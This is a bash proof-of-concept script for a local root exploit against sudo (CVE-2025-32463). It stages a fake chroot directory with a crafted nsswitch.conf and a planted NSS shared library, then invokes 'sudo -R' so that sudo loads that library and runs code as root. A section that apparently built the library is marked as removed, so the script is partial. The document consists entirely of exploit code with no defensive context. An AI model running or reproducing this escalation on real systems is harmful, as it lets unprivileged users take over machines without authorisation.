#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/woot)
cd ${STAGE?} || exit 1

# Section Removed

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
cp /tmp/woot.so.2 libnss_/woot1337.so.2

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}
